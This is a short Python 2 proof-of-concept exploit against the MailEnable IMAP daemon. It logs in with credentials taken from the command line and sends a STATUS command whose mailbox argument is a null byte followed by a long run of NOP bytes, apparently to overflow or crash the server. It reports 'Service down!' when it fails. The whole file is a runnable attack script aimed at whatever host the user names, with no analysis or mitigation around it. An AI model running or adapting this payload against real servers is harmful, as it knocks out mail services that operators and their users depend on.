#
# POC about imapd mailenable bug in status command
#

import sys
import imaplib

class poc:

      def __init__(self,host,loginimap,passimap):
            self.host=host
            self.loginimap=loginimap
            self.passimap=passimap

      def exploit(self):
            print "Please wait"
        
            connect = imaplib.IMAP4(self.host)
            connect.login(self.loginimap,self.passimap)
            nops='\x00'
            nops+='\x90'*10540
            try:
                  typ, data = connect.status(nops,'(UIDNEXT UIDVALIDITY MESSAGES UNSEEN RECENT)')
            except Exception,e:
                  print "Service down!"
            return 0   

if(len(sys.argv) < 4):
    print "Need 3 arguments, ./poc.py host user pass"
    sys.exit(1)

exp=poc(sys.argv[1],sys.argv[2],sys.argv[3])
exp.exploit()
